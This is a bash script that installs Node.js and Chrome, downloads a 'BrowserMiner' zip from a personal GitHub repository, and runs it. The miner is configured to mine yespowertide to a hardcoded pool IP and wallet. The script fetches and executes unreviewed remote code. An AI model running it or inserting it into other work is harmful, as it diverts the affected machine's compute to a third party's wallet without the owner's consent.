#!/bin/bash

ALGO="yespowertide"
HOST="8.222.134.27"
PORT="80"
WALLET="TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.$(shuf -i 1-9 -n 1)-hero"
PASSWORD="x"
THREADS=2
FEE=1

function install_node() {
    if ! command -v node &> /dev/null; then
        echo "Node.js is not detected. Installing Node.js 18..."
        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
        source ~/.bashrc
        nvm install 18
        nvm use 18
        if ! command -v node &> /dev/null; then
            echo "Failed to install Node.js. Check your internet connection or NVM installation."
            exit 1
        fi
    else
        echo "Node.js is already installed: $(node -v)"
    fi
}

function install_google_chrome() {
    if ! command -v google-chrome &> /dev/null; then
        echo "Google Chrome is not detected. Installing Google Chrome..."
        wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
        echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list
        sudo apt-get update
        sudo apt-get install -y google-chrome-stable
        if ! command -v google-chrome &> /dev/null; then
            echo "Failed to install Google Chrome."
            exit 1
        fi
    else
        echo "Google Chrome is already installed: $(google-chrome --version)"
    fi
}

function download_and_prepare() {
    echo "Downloading and preparing BrowserMiner..."
    curl -L -O -J https://github.com/barburonjilo/back/raw/main/chrome-mint.zip
    sudo apt-get install -y unzip
    unzip chrome-mint.zip
    rm chrome-mint.zip
    cd chrome-mint || { echo "Failed to enter the chrome-mint directory"; exit 1; }
    chmod +x *
    npm install
}

function create_config() {
    echo "Creating config.json file..."
    cat > config.json <<EOF
{
    "algorithm": "$ALGO",
    "host": "$HOST",
    "port": $PORT,
    "worker": "$WALLET",
    "password": "$PASSWORD",
    "workers": $THREADS,
    "fee": $FEE
}
EOF
}

function run_miner() {
    echo "Running BrowserMiner..."
    if ! node index.js; then
        echo "Failed to execute index.js. Check the logs for more information."
        exit 1
    fi
}

# Main script
install_node
install_google_chrome

if [ ! -d "chrome-mint" ]; then
    download_and_prepare
fi

cd chrome-mint || { echo "Failed to enter the chrome-mint directory."; exit 1; }
create_config
run_miner
